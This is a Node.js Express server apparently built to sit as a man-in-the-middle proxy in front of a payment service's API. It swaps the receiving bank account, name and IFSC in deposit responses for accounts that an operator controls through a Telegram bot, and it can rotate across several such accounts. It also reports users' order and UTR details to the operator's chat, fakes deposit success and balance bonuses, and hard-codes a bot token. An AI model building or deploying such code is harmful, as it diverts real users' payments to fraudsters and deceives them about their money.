const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');
const kv = new Redis({
  url: process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN
});

const app = express();

const ORIGINAL_API = 'https://api.i-money.vip';
const token = '8728397123:AAH7SGg0CBGLHds2QSMxps0F1FkCIvlmbvM';
const WEBHOOK_URL = 'https://ixcv.vercel.app/api/telegram';
let bot;
let webhookSet = false;

if (token) {
  bot = new TelegramBot(token);
}

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch (e) {}
}

const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1, depositSuccess: false, depositBonus: 0 };

async function loadData() {
  try {
    let data = await kv.get('bankData');
    if (data) {
      if (typeof data === 'string') data = JSON.parse(data);
      return data;
    }
  } catch (e) {}
  return { ...DEFAULT_DATA };
}

async function saveData(data) {
  try { await kv.set('bankData', JSON.stringify(data)); } catch (e) {}
}

function getActiveBank(d) {
  if (d.autoRotate && d.banks.length > 0) {
    if (d.banks.length === 1) return d.banks[0];
    let nextIndex;
    do {
      nextIndex = Math.floor(Math.random() * d.banks.length);
    } while (nextIndex === d.lastUsedIndex && d.banks.length > 1);
    d.lastUsedIndex = nextIndex;
    d._rotatedIndex = nextIndex;
    return d.banks[nextIndex];
  }
  if (d.activeIndex >= 0 && d.activeIndex < d.banks.length) return d.banks[d.activeIndex];
  return null;
}

async function getActiveBankAndSave(d) {
  const bank = getActiveBank(d);
  if (d.autoRotate && d._rotatedIndex !== undefined) {
    d.lastUsedIndex = d._rotatedIndex;
    delete d._rotatedIndex;
    await saveData(d);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${a}`;
  }).join('\n');
}

app.use((req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const bodyStr = req.rawBody.toString();
    req.parsedBody = {};
    try {
      req.parsedBody = JSON.parse(bodyStr);
    } catch(e) {
      if (bodyStr && bodyStr.includes('=')) {
        const params = new URLSearchParams(bodyStr);
        for (const [k, v] of params) req.parsedBody[k] = v;
      }
    }
    next();
  });
});

async function transparentProxy(req, res) {
  try {
    const url = ORIGINAL_API + req.originalUrl;
    const forwardHeaders = {};
    for (const [key, val] of Object.entries(req.headers)) {
      const k = key.toLowerCase();
      if (k === 'host' || k === 'connection' || k === 'content-length' || 
          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
      forwardHeaders[key] = val;
    }
    forwardHeaders['host'] = 'api.i-money.vip';

    const opts = { method: req.method, headers: forwardHeaders };

    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      forwardHeaders['content-length'] = String(req.rawBody.length);
    }

    const response = await fetch(url, opts);

    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding') {
        respHeaders[key] = val;
      }
    });
    
    const body = await response.arrayBuffer();
    const buf = Buffer.from(body);

    res.writeHead(response.status, respHeaders);
    res.end(buf);
    return buf;
  } catch (e) {
    console.error('Proxy error:', req.method, req.originalUrl, e.message);
    if (!res.headersSent) {
      res.status(502).json({ code: 0, msg: 'Proxy error' });
    }
    return null;
  }
}

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch (e) { res.json({ error: e.message }); }
});

app.post('/api/telegram', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);

    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);

    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let bankData = await loadData();

    if (text === '/start') {
      if (bankData.adminChatId && bankData.adminChatId !== chatId) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }
      bankData.adminChatId = chatId;
      if (bankData.botEnabled === undefined) bankData.botEnabled = true;
      if (bankData.autoRotate === undefined) bankData.autoRotate = false;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`🏦 IMoney Bank Controller

/addbank <AccNo> | <Name> | <IFSC>
/removebank <number>
/usebank <number>
/deactivate
/list
/status

/on - Bot ON (overlay + notifications)
/off - Bot OFF (normal mode, no overlay)

/rotate on - Auto rotate banks
/rotate off - Use fixed bank

/deposit on <amount> - Deposits success + add balance
/deposit off - Restore real data

Example:
/addbank 1234567890 | Rahul Kumar | SBIN0001234
/usebank 1`
      );
    }

    else if (bankData.adminChatId && chatId !== bankData.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    else if (text.startsWith('/addbank ')) {
      const parts = text.substring(9).split('|').map(s => s.trim());
      if (parts.length !== 3) {
        await bot.sendMessage(chatId, '❌ Format: /addbank AccNo | Name | IFSC');
        return res.sendStatus(200);
      }
      if (bankData.banks.length >= 10) {
        await bot.sendMessage(chatId, '❌ Max 10 banks.');
        return res.sendStatus(200);
      }
      bankData.banks.push({ accountNo: parts[0], accountHolder: parts[1], ifsc: parts[2] });
      if (bankData.banks.length === 1) bankData.activeIndex = 0;
      await saveData(bankData);
      await bot.sendMessage(chatId,
`✅ Bank #${bankData.banks.length} added:
${parts[0]} | ${parts[1]} | ${parts[2]}
${bankData.banks.length === 1 ? '(Auto-activated)' : '/usebank ' + bankData.banks.length + ' to activate'}`
      );
    }

    else if (text.startsWith('/removebank ')) {
      const num = parseInt(text.substring(12).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
        return res.sendStatus(200);
      }
      const removed = bankData.banks.splice(num - 1, 1)[0];
      if (bankData.activeIndex === num - 1) bankData.activeIndex = bankData.banks.length > 0 ? 0 : -1;
      else if (bankData.activeIndex > num - 1) bankData.activeIndex--;
      await saveData(bankData);
      await bot.sendMessage(chatId, `🗑 Removed: ${removed.accountHolder} | ${removed.accountNo}`);
    }

    else if (text.startsWith('/usebank ')) {
      const num = parseInt(text.substring(9).trim());
      if (isNaN(num) || num < 1 || num > bankData.banks.length) {
        await bot.sendMessage(chatId, '❌ Invalid. /list se check karo.');
        return res.sendStatus(200);
      }
      bankData.activeIndex = num - 1;
      await saveData(bankData);
      const bank = bankData.banks[bankData.activeIndex];
      await bot.sendMessage(chatId,
`✅ Bank #${num} ACTIVE:
${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
      );
    }

    else if (text === '/deactivate') {
      bankData.activeIndex = -1;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 All banks deactivated.');
    }

    else if (text === '/on') {
      bankData.botEnabled = true;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🟢 Bot ON! Bank overlay + notifications active.');
    }

    else if (text === '/off') {
      bankData.botEnabled = false;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 Bot OFF! No overlay, no notifications. App works normally.');
    }

    else if (text === '/rotate on') {
      if (bankData.banks.length < 2) {
        await bot.sendMessage(chatId, '❌ Add at least 2 banks for auto-rotate.');
        return res.sendStatus(200);
      }
      bankData.autoRotate = true;
      bankData.lastUsedIndex = -1;
      await saveData(bankData);
      await bot.sendMessage(chatId, `🔄 Auto-Rotate ON!\n${bankData.banks.length} banks in rotation. Every order will use a different bank.`);
    }

    else if (text === '/rotate off') {
      bankData.autoRotate = false;
      await saveData(bankData);
      const active = getActiveBank(bankData);
      await bot.sendMessage(chatId, `🔄 Auto-Rotate OFF!\nFixed bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None (use /usebank)'}`);
    }

    else if (text.startsWith('/deposit on')) {
      const amountStr = text.substring(11).trim();
      const amount = parseFloat(amountStr);
      if (amountStr && isNaN(amount)) {
        await bot.sendMessage(chatId, '❌ Format: /deposit on <amount>\nExample: /deposit on 5000');
        return res.sendStatus(200);
      }
      bankData.depositSuccess = true;
      bankData._debugSent = false;
      if (!isNaN(amount) && amount > 0) {
        bankData.depositBonus = (bankData.depositBonus || 0) + amount;
      }
      await saveData(bankData);
      await bot.sendMessage(chatId,
`✅ Deposit SUCCESS mode ON!

${amount > 0 ? '💰 Added: ₹' + amount + '\n' : ''}Balance Bonus: ₹${bankData.depositBonus || 0}

Pending orders → Success ✅
Bonus added to balance ✅

/deposit on 3000 — add more
/deposit off — restore real data`
      );
    }

    else if (text === '/deposit off') {
      bankData.depositSuccess = false;
      bankData.depositBonus = 0;
      await saveData(bankData);
      await bot.sendMessage(chatId, '🔴 Deposit OFF! Real data restored. Bonus balance removed.');
    }

    else if (text === '/list') {
      const rotateStatus = bankData.autoRotate ? '🔄 Auto-Rotate: ON' : '🔄 Auto-Rotate: OFF';
      const botStatus = bankData.botEnabled !== false ? '🟢 Bot: ON' : '🔴 Bot: OFF';
      const depositStatus = bankData.depositSuccess ? '✅ Deposit: SUCCESS mode' : '🔴 Deposit: Normal mode';
      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}\n\n${botStatus}\n${rotateStatus}\n${depositStatus}`);
    }

    else if (text === '/status') {
      const botOn = bankData.botEnabled !== false;
      const rotate = bankData.autoRotate === true;
      const deposit = bankData.depositSuccess === true;
      const active = getActiveBank(bankData);
      let msg = `📊 Status:\n\n`;
      msg += `Bot: ${botOn ? '🟢 ON' : '🔴 OFF'}\n`;
      msg += `Auto-Rotate: ${rotate ? '🔄 ON (' + bankData.banks.length + ' banks)' : '❌ OFF'}\n`;
      msg += `Deposit: ${deposit ? '✅ SUCCESS mode (₹' + (bankData.depositBonus || 0) + ' bonus)' : '🔴 Normal'}\n`;
      msg += `Banks: ${bankData.banks.length}\n`;
      if (active) {
        msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
      } else {
        msg += `\n⚠️ No active bank`;
      }
      await bot.sendMessage(chatId, msg);
    }

    return res.sendStatus(200);
  } catch (err) {
    console.error('Telegram error:', err);
    return res.sendStatus(200);
  }
});

app.all('/wallet/online/walletType', async (req, res) => {
  const bankData = await loadData();
  if (bankData.botEnabled === false) return await transparentProxy(req, res);
  const active = await getActiveBankAndSave(bankData);
  if (!active) return await transparentProxy(req, res);

  try {
    const url = ORIGINAL_API + req.originalUrl;
    const forwardHeaders = {};
    for (const [key, val] of Object.entries(req.headers)) {
      const k = key.toLowerCase();
      if (k === 'host' || k === 'connection' || k === 'content-length' ||
          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
      forwardHeaders[key] = val;
    }
    forwardHeaders['host'] = 'api.i-money.vip';

    const opts = { method: req.method, headers: forwardHeaders };
    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      forwardHeaders['content-length'] = String(req.rawBody.length);
    }
    const response = await fetch(url, opts);
    const respBody = await response.text();

    let jsonResp;
    try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }

    if (bankData.adminChatId && bot) {
      bot.sendMessage(bankData.adminChatId, '🔍 WalletType DEBUG:\n' + JSON.stringify(jsonResp, null, 2).substring(0, 3000)).catch(() => {});
      
    }

    if (jsonResp && jsonResp.data) {
      if (jsonResp.data.receiveAccountNo !== undefined) jsonResp.data.receiveAccountNo = active.accountNo;
      if (jsonResp.data.receiveAccountName !== undefined) jsonResp.data.receiveAccountName = active.accountHolder;
      if (jsonResp.data.receiveIfsc !== undefined) jsonResp.data.receiveIfsc = active.ifsc;
      if (jsonResp.data.accountNo !== undefined) jsonResp.data.accountNo = active.accountNo;
      if (jsonResp.data.accountName !== undefined) jsonResp.data.accountName = active.accountHolder;
      if (jsonResp.data.ifsc !== undefined) jsonResp.data.ifsc = active.ifsc;

      if (jsonResp.data.fallbackUrl && typeof jsonResp.data.fallbackUrl === 'string') {
        let fUrl = jsonResp.data.fallbackUrl;
        fUrl = fUrl.replace(/accountNo=[^&]*/gi, 'accountNo=' + encodeURIComponent(active.accountNo));
        fUrl = fUrl.replace(/accountName=[^&]*/gi, 'accountName=' + encodeURIComponent(active.accountHolder));
        fUrl = fUrl.replace(/account_no=[^&]*/gi, 'account_no=' + encodeURIComponent(active.accountNo));
        fUrl = fUrl.replace(/account_name=[^&]*/gi, 'account_name=' + encodeURIComponent(active.accountHolder));
        fUrl = fUrl.replace(/ifsc=[^&]*/gi, 'ifsc=' + encodeURIComponent(active.ifsc));
        fUrl = fUrl.replace(/beneficiary_name=[^&]*/gi, 'beneficiary_name=' + encodeURIComponent(active.accountHolder));
        fUrl = fUrl.replace(/account_number=[^&]*/gi, 'account_number=' + encodeURIComponent(active.accountNo));
        fUrl = fUrl.replace(/ifsc_code=[^&]*/gi, 'ifsc_code=' + encodeURIComponent(active.ifsc));
        jsonResp.data.fallbackUrl = fUrl;
      }

      if (jsonResp.code === undefined) jsonResp.code = 1;
    }

    const finalBody = JSON.stringify(jsonResp || { code: 1, data: { receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder, receiveIfsc: active.ifsc, walletType: 'paytm' }, msg: 'success' });
    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
        respHeaders[key] = val;
      }
    });
    respHeaders['content-type'] = 'application/json; charset=utf-8';
    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
    res.writeHead(response.status, respHeaders);
    res.end(finalBody);
  } catch(e) {
    console.error('walletType proxy error:', e.message);
    res.json({
      code: 1,
      data: { receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder, receiveIfsc: active.ifsc, walletType: 'paytm' },
      msg: 'success'
    });
  }
});

app.post('/money/uploadUtr', async (req, res) => {
  const bankData = await loadData();
  if (bankData.botEnabled === false) return await transparentProxy(req, res);
  if (bankData.adminChatId && bot) {
    let b = req.parsedBody || {};
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.includes('multipart/form-data')) {
      const bodyStr = req.rawBody.toString();
      const utrMatch = bodyStr.match(/name="utr"[\r\n]+([^\r\n-]+)/);
      const orderMatch = bodyStr.match(/name="orderId"[\r\n]+([^\r\n-]+)/);
      const amountMatch = bodyStr.match(/name="utrAmount"[\r\n]+([^\r\n-]+)/);
      if (utrMatch) b.utr = utrMatch[1].trim();
      if (orderMatch) b.orderId = orderMatch[1].trim();
      if (amountMatch) b.utrAmount = amountMatch[1].trim();
    }
    const qs = new URLSearchParams(req.originalUrl.split('?')[1] || '');
    if (!b.utr && qs.get('utr')) b.utr = qs.get('utr');
    if (!b.orderId && qs.get('orderId')) b.orderId = qs.get('orderId');
    if (!b.utrAmount && qs.get('utrAmount')) b.utrAmount = qs.get('utrAmount');

    bot.sendMessage(bankData.adminChatId,
`💰 UTR Uploaded!
Order: ${b.orderId || 'N/A'}
UTR: ${b.utr || 'N/A'}
Amount: ₹${b.utrAmount || 'N/A'}
Type: ${contentType || 'unknown'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }
  await transparentProxy(req, res);
});

app.post('/money/cancelUtr', async (req, res) => {
  const bankData = await loadData();
  if (bankData.botEnabled === false) return await transparentProxy(req, res);
  if (bankData.adminChatId && bot) {
    bot.sendMessage(bankData.adminChatId,
`❌ UTR Cancelled!
Order: ${req.parsedBody?.orderId || 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
    ).catch(() => {});
  }
  await transparentProxy(req, res);
});

async function proxyAndReplaceBankDetails(req, res, label) {
  const bankData = await loadData();
  if (bankData.botEnabled === false) return await transparentProxy(req, res);
  const active = await getActiveBankAndSave(bankData);

  try {
    const url = ORIGINAL_API + req.originalUrl;
    const forwardHeaders = {};
    for (const [key, val] of Object.entries(req.headers)) {
      const k = key.toLowerCase();
      if (k === 'host' || k === 'connection' || k === 'content-length' ||
          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
      forwardHeaders[key] = val;
    }
    forwardHeaders['host'] = 'api.i-money.vip';

    const opts = { method: req.method, headers: forwardHeaders };
    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      forwardHeaders['content-length'] = String(req.rawBody.length);
    }

    const response = await fetch(url, opts);
    const respBody = await response.text();

    let jsonResp;
    try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }

    if (jsonResp && jsonResp.data && active) {
      if (jsonResp.data.receiveAccountNo !== undefined) jsonResp.data.receiveAccountNo = active.accountNo;
      if (jsonResp.data.receiveAccountName !== undefined) jsonResp.data.receiveAccountName = active.accountHolder;
      if (jsonResp.data.receiveIfsc !== undefined) jsonResp.data.receiveIfsc = active.ifsc;
      if (jsonResp.data.accountNo !== undefined) jsonResp.data.accountNo = active.accountNo;
      if (jsonResp.data.accountName !== undefined) jsonResp.data.accountName = active.accountHolder;
      if (jsonResp.data.accountHolder !== undefined) jsonResp.data.accountHolder = active.accountHolder;
      if (jsonResp.data.ifsc !== undefined) jsonResp.data.ifsc = active.ifsc;
      if (jsonResp.data.ifscCode !== undefined) jsonResp.data.ifscCode = active.ifsc;
    }

    if (bankData.adminChatId && bot) {
      const orderId = jsonResp?.data?.orderId || req.parsedBody?.orderId || 'N/A';
      const amount = jsonResp?.data?.amount || req.parsedBody?.amount || 'N/A';
      bot.sendMessage(bankData.adminChatId,
`🔔 ${label}
Order: ${orderId}
Amount: ₹${amount}
Bank: ${active ? active.accountHolder : 'None'}
Acc: ${active ? active.accountNo : 'N/A'}
Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(() => {});
    }

    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
        respHeaders[key] = val;
      }
    });

    const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
    respHeaders['content-type'] = 'application/json; charset=utf-8';
    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));

    res.writeHead(response.status, respHeaders);
    res.end(finalBody);
  } catch (e) {
    console.error('Proxy+replace error:', req.method, req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
}

function markDepositSuccess(obj) {
  if (!obj) return;
  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
  if (obj.payStatus !== undefined) {
    if (!failValues.includes(obj.payStatus)) {
      obj.payStatus = 2;
    }
    return;
  }
  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state'];
  for (const field of statusFields) {
    if (obj[field] !== undefined) {
      if (failValues.includes(obj[field])) continue;
      if (typeof obj[field] === 'number') {
        obj[field] = 2;
      } else if (typeof obj[field] === 'string') {
        const num = parseInt(obj[field]);
        if (!isNaN(num)) {
          obj[field] = '2';
        } else {
          obj[field] = 'success';
        }
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'rechargebalance', 'totalamount', 'availableamount'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

async function proxyAndAddBonus(req, res) {
  const bankData = await loadData();
  const bonus = bankData.depositSuccess ? (bankData.depositBonus || 0) : 0;
  if (bonus === 0) return await transparentProxy(req, res);

  try {
    const url = ORIGINAL_API + req.originalUrl;
    const forwardHeaders = {};
    for (const [key, val] of Object.entries(req.headers)) {
      const k = key.toLowerCase();
      if (k === 'host' || k === 'connection' || k === 'content-length' ||
          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
      forwardHeaders[key] = val;
    }
    forwardHeaders['host'] = 'api.i-money.vip';

    const opts = { method: req.method, headers: forwardHeaders };
    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      forwardHeaders['content-length'] = String(req.rawBody.length);
    }

    const response = await fetch(url, opts);
    const respBody = await response.text();

    let jsonResp;
    try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }

    if (jsonResp && jsonResp.data) {
      addBonusToBalanceFields(jsonResp.data, bonus);
    }

    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
        respHeaders[key] = val;
      }
    });

    const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
    respHeaders['content-type'] = 'application/json; charset=utf-8';
    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
    res.writeHead(response.status, respHeaders);
    res.end(finalBody);
  } catch(e) {
    console.error('Balance proxy error:', e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
}

function replaceBankInObject(obj, active) {
  if (!obj || !active) return;
  const bankFields = {
    receiveAccountNo: active.accountNo,
    receiveAccountName: active.accountHolder,
    receiveIfsc: active.ifsc,
    accountNo: active.accountNo,
    accountName: active.accountHolder,
    accountHolder: active.accountHolder,
    ifsc: active.ifsc,
    ifscCode: active.ifsc,
    bankAccountNo: active.accountNo,
    bankAccountName: active.accountHolder,
    bankIfsc: active.ifsc
  };
  for (const [key, val] of Object.entries(bankFields)) {
    if (obj[key] !== undefined) obj[key] = val;
  }
}

async function proxyAndReplaceBankInList(req, res) {
  const bankData = await loadData();
  if (bankData.botEnabled === false && !bankData.depositSuccess) return await transparentProxy(req, res);
  const active = bankData.botEnabled !== false ? await getActiveBankAndSave(bankData) : null;

  try {
    const url = ORIGINAL_API + req.originalUrl;
    const forwardHeaders = {};
    for (const [key, val] of Object.entries(req.headers)) {
      const k = key.toLowerCase();
      if (k === 'host' || k === 'connection' || k === 'content-length' ||
          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
      forwardHeaders[key] = val;
    }
    forwardHeaders['host'] = 'api.i-money.vip';

    const opts = { method: req.method, headers: forwardHeaders };
    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
      opts.body = req.rawBody;
      forwardHeaders['content-length'] = String(req.rawBody.length);
    }

    const response = await fetch(url, opts);
    const respBody = await response.text();

    let jsonResp;
    try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }

    if (jsonResp && jsonResp.data && bankData.depositSuccess && bankData.adminChatId && bot) {
      const items = Array.isArray(jsonResp.data) ? jsonResp.data :
                    jsonResp.data.list ? jsonResp.data.list :
                    jsonResp.data.records ? jsonResp.data.records : [jsonResp.data];
      if (items.length > 0 && !bankData._debugSent) {
        const sample = JSON.stringify(items[0], null, 2).substring(0, 2000);
        bot.sendMessage(bankData.adminChatId, `🔍 DEBUG ${req.path}:\n${sample}`).catch(() => {});
        bankData._debugSent = true;
        saveData(bankData).catch(() => {});
      }
    }

    if (jsonResp && jsonResp.data) {
      const applyToItem = (item) => {
        if (active) replaceBankInObject(item, active);
        if (bankData.depositSuccess) markDepositSuccess(item);
      };
      if (Array.isArray(jsonResp.data)) {
        jsonResp.data.forEach(applyToItem);
      } else if (jsonResp.data.list && Array.isArray(jsonResp.data.list)) {
        jsonResp.data.list.forEach(applyToItem);
      } else if (jsonResp.data.records && Array.isArray(jsonResp.data.records)) {
        jsonResp.data.records.forEach(applyToItem);
      } else {
        applyToItem(jsonResp.data);
      }
    }

    const respHeaders = {};
    response.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
        respHeaders[key] = val;
      }
    });

    const finalBody = jsonResp ? JSON.stringify(jsonResp) : respBody;
    respHeaders['content-type'] = 'application/json; charset=utf-8';
    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));

    res.writeHead(response.status, respHeaders);
    res.end(finalBody);
  } catch (e) {
    console.error('Proxy+list replace error:', req.method, req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ code: 0, msg: 'Proxy error' });
  }
}

app.post('/money/orderId', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, 'New Order!');
});

app.post('/money/create/v2', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, 'New Order (v2)!');
});

app.post('/money/init/order', async (req, res) => {
  await proxyAndReplaceBankDetails(req, res, 'Init Order!');
});

app.all('/money/order/list', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/list/v2', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/order/detail', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/orderDetail', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/rechargeRecord', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/money/withdrawRecord', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});
app.all('/user/cashFlow', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.post('/money/check/payStatus', async (req, res) => {
  await proxyAndReplaceBankInList(req, res);
});

app.all('/user/*', async (req, res) => {
  const path = req.path.toLowerCase();
  if (path === '/user/cashflow') return await proxyAndReplaceBankInList(req, res);
  await proxyAndAddBonus(req, res);
});

app.get('/debug/recharge', async (req, res) => {
  try {
    const response = await fetch(ORIGINAL_API + '/money/rechargeRecord', {
      method: 'POST',
      headers: { 'host': 'api.i-money.vip', 'content-type': 'application/json' },
      body: JSON.stringify({ page: 1, pageSize: 5 })
    });
    const data = await response.json();
    const bankData = await loadData();
    if (bankData.adminChatId && bot) {
      bot.sendMessage(bankData.adminChatId, '🔍 Recharge Debug:\n' + JSON.stringify(data, null, 2).substring(0, 3000)).catch(() => {});
    }
    res.json(data);
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/debug/userinfo', async (req, res) => {
  try {
    const response = await fetch(ORIGINAL_API + '/user/info', {
      headers: { 'host': 'api.i-money.vip', ...req.headers }
    });
    const data = await response.json();
    const bankData = await loadData();
    if (bankData.adminChatId && bot) {
      bot.sendMessage(bankData.adminChatId, '🔍 User Info Debug:\n' + JSON.stringify(data, null, 2).substring(0, 3000)).catch(() => {});
    }
    res.json(data);
  } catch(e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const bankData = await loadData();
  const active = getActiveBank(bankData);
  res.json({ status: 'ok', bankActive: !!active, totalBanks: bankData.banks.length, adminSet: !!bankData.adminChatId });
});

app.use(async (req, res) => {
  await transparentProxy(req, res);
});

module.exports = app;
